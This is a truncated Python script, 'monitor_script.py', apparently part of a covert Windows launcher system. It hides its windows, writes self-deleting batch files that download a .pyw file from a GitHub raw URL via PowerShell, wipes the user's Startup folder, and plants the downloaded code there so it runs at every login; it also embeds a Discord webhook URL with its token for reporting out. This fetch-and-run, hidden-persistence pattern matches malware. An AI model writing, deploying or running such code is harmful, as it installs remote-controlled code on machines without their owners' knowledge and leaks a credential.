# monitor_script.py - Deletes old files THEN creates new launcher
import os
import sys
import subprocess
import tempfile
import time
import urllib.request
import requests

# Discord webhook
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    """Send simple webhook"""
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def download_new_launcher():
    """Download the clean launcher from GitHub"""
    try:
        launcher_url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
        
        # Download the launcher code
        response = urllib.request.urlopen(launcher_url, timeout=10)
        launcher_code = response.read().decode('utf-8')
        
        # Save it to a safe location (temp folder)
        temp_launcher = tempfile.gettempdir() + "/new_launcher.pyw"
        with open(temp_launcher, 'w', encoding='utf-8') as f:
            f.write(launcher_code)
        
        print(f"✓ Downloaded new launcher ({len(launcher_code)} bytes)")
        return temp_launcher
        
    except Exception as e:
        print(f"✗ Failed to download launcher: {e}")
        return None

def delete_old_files():
    """Delete old files from startup folder"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # Create a batch file that deletes everything BUT creates new launcher
    batch_script = f'''@echo off
cd /d "{startup_folder}"

echo [CLEANUP] Deleting old files...

:: First, download the new launcher to temp folder
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw' -OutFile '{tempfile.gettempdir()}\\new_launcher.pyw'"

:: Now delete all old files
del /f /q startup_log.txt 2>nul
del /f /q monitor_script.py 2>nul
del /f /q monitor.py 2>nul
del /f /q update_cache.json 2>nul
del /f /q requirements.txt 2>nul
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.json 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.pyc 2>nul

:: Delete __pycache__ folders
for /d %%d in (__pycache__) do (
    rmdir /s /q "%%d" 2>nul
)

echo [SETUP] Creating new launcher...

:: Copy the downloaded launcher to startup folder
copy "{tempfile.gettempdir()}\\new_launcher.pyw" "Startup.pyw" /Y >nul
copy "{tempfile.gettempdir()}\\new_launcher.pyw" "github_launcher.pyw" /Y >nul

:: Clean up temp files
del /f /q "{tempfile.gettempdir()}\\new_launcher.pyw" 2>nul

echo [COMPLETE] Cleanup done, new launcher installed!
timeout /t 3 /nobreak >nul
del "%~f0" 2>nul
'''
    
    # Save and run the batch file
    batch_path = tempfile.gettempdir() + "/cleanup_and_setup.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run hidden
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    process = subprocess.Popen(
        ['cmd', '/c', batch_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    # Wait for completion
    time.sleep(5)
    
    # Check if new launcher was created
    startup_path = os.path.join(startup_folder, "Startup.pyw")
    if os.path.exists(startup_path):
        print("✓ New launcher created successfully")
        return True
    else:
        print("✗ Failed to create new launcher")
        return False

def run_new_launcher():
    """Run the newly created launcher"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        launcher_path = os.path.join(startup_folder, "Startup.pyw")
        
        if os.path.exists(launcher_path):
            print("Starting new launcher...")
            
            # Create batch file to run new launcher
            batch_script = f'''@echo off
timeout /t 5 /nobreak >nul
start /b "" "{sys.executable}" "{launcher_path}"
del "%~f0"
'''
            
            batch_path = tempfile.gettempdir() + "/start_new.bat"
            with open(batch_path, 'w') as f:
                f.write(batch
